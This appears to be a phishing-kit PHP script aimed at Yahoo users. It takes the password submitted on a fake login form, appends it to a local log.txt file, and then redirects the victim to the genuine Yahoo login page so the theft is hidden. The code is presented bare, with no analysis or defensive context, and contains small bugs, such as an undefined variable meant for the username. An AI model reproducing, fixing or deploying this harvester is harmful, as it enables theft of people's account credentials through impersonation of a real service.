<?php
$name1=strip_tags($_POST["login-passwd"]);
$file=fopen("log.txt","a");
fwrite($file, 'USER: '.$name1."\nPASS: ".$name2."\n\n");{
fclose($file);
} ?>


<html>
<meta http-equiv="refresh" content="0; URL='https://login.yahoo.com/m'" />
</html>
